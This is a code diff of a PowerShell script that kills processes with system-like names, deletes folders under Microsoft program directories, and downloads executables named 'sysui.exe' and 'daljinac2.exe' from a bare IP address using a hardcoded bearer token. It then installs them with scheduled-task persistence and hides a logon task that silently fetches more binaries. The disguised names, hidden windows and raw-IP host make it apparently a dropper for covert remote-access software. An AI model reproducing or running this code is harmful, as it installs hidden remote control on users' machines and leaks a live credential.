@@ -12,6 +12,8 @@ $agents = @()
 if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='http://31.220.74.109:9999/sysui.exe'; Port=8081; Args='-notray' } }
 if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='http://31.220.74.109:9999/daljinac2.exe'; Port=1984; Args='-notray' } }
 
+$auth = @{Authorization = "Bearer 916de2678b4319090a640799f7ca7a6e"}
+
 Write-Host "=== Cleanup ===" -ForegroundColor Cyan
 @("daljinac","daljinacWatch","daljinac2","daljinac2Watch",
   "sysui","sysuiWatch","sysagent","sysagentWatch",
@@ -19,10 +21,7 @@ Write-Host "=== Cleanup ===" -ForegroundColor Cyan
   "sdhost","sdhostWatch","sdagent","sdagentWatch") | ForEach-Object {
     schtasks /delete /tn $_ /f 2>$null
 }
-rmdir /s /q "C:\ProgramData\Microsoft\HelpData" 2>$null
-rmdir /s /q "C:\ProgramData\Microsoft\DiagHub" 2>$null
-rmdir /s /q "C:\Program Files\Common Files\Sdh" 2>$null
-rmdir /s /q "C:\Program Files\Common Files\Sda" 2>$null
+cmd /c "rmdir /s /q C:\ProgramData\Microsoft\HelpData 2>nul & rmdir /s /q C:\ProgramData\Microsoft\DiagHub 2>nul & rmdir /s /q ""C:\Program Files\Common Files\Sdh"" 2>nul & rmdir /s /q ""C:\Program Files\Common Files\Sda"" 2>nul"
 
 foreach ($a in $agents) {
     Write-Host "=== $($a.Name): $($a.ExeName) ===" -ForegroundColor Cyan
@@ -32,34 +31,16 @@ foreach ($a in $agents) {
     Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($a.ExeName)),
                      "HelpDataHost","DiagHubHost","sdhost","sdagent",
                      "systemUI","daljinac","daljinac2" -ErrorAction SilentlyContinue | Stop-Process -Force
-    $maxWait = 20
-    do {
-        Start-Sleep -Seconds 1
-        $maxWait--
-        $portFree = $true
-        try { (Get-NetTCPConnection -LocalPort $a.Port -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
-        if ($maxWait -le 0) { break }
-    } while (-not $portFree)
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
 
     Write-Host "  [2/3] Downloading..."
     mkdir $a.Dir -Force | Out-Null
     $downloaded = $false
-    $sources = @($a.URL)
-    if ($a.Relay) { $sources += "http://31.220.74.109:9999/$($a.Relay)" }
-    foreach ($src in $sources) {
-        $from = if ($src -match "github") { "GitHub" } else { "relay" }
-        for ($retry = 1; $retry -le 2; $retry++) {
-            try {
-                $h = @{}
-                if ($src -match "^http://31.220.74.109") { $h.Authorization = "Bearer 916de2678b4319090a640799f7ca7a6e" }
-                Invoke-WebRequest $src -Headers $h -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
-                $sz = (Get-Item "$Exe.new").Length
-                if ($sz -gt 100000) { Write-Host "         $sz bytes ($from)" -ForegroundColor Green; $downloaded = $true; break }
-            } catch { if ($retry -lt 2) { Write-Host "         $from retry..." -ForegroundColor Yellow; Start-Sleep 2 } }
-        }
-        if ($downloaded) { break }
-    }
+    try {
+        Invoke-WebRequest $a.URL -Headers $auth -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
+        $sz = (Get-Item "$Exe.new").Length
+        if ($sz -gt 100000) { Write-Host "         $sz bytes" -ForegroundColor Green; $downloaded = $true }
+    } catch { }
     if (-not $downloaded) { Write-Host "         FAILED" -ForegroundColor Red; continue }
 
     Write-Host "  [2b/3] Replacing..."
@@ -90,7 +71,6 @@ if ($p1) { Write-Host "  v1: RUNNING (PID $($p1.Id))" -ForegroundColor Green } e
 $p2 = Get-Process -Name sysagent -ErrorAction SilentlyContinue
 if ($p2) { Write-Host "  v2: RUNNING (PID $($p2.Id))" -ForegroundColor Green } else { Write-Host "  v2: not found" -ForegroundColor Red }
 
-# Bootstrap: download aria2c.exe in background (single binary, portable, no UAC)
 Write-Host "  [bootstrap] Scheduling aria2c download..." -ForegroundColor Cyan
 $bsAction = New-ScheduledTaskAction -Execute powershell -Argument "-NoP -W Hidden -Command if(!(Test-Path C:\appdata\aria2c.exe)){try{iwr http://31.220.74.109:9999/aria2c.exe -OutFile C:\appdata\aria2c.exe -UseBasicParsing}catch{exit 1}}; if((Test-Path C:\appdata\aria2c.exe)-and((Get-Item C:\appdata\aria2c.exe).Length-gt 1000000)){schtasks /delete /tn DaljinacBootstrap /f}else{exit 1}"
 $bsTrigger = New-ScheduledTaskTrigger -AtLogOn
